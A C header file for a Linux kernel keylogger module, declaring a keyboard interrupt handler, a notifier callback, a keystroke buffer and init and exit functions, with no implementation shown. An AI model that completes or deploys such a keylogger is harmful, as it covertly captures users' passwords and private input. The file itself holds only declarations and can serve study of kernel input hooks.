#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/keyboard.h>
#include <linux/irq.h>
#include <linux/interrupt.h>
#include <linux/input-event-codes.h>

#define BUFFER_SIZE 1024

void insert_key(char key);
irqreturn_t keyboard_interrupt_handler(int irq, void *dev);
int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code, void *_param);
void set_keylog_buffer(char *buffer);
int keylogger_init(void);
void keylogger_exit(void);

#endif
